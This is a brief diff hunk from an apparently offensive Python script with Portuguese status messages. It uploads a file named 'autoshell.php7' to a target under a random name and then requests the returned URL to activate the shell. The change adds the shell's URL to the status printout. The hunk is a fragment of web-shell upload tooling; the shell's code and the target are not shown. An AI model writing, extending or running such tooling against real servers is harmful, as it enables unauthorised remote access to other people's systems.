@@ -23,5 +23,5 @@ print(" * Fazendo Upload")
 
 url = ctx.upload(randomString(8), 'autoshell.php7', open('autoshell.php7'))
 
-print(" * Ligando shell")
+print(f" * Ligando shell url={url}")
 get(url)
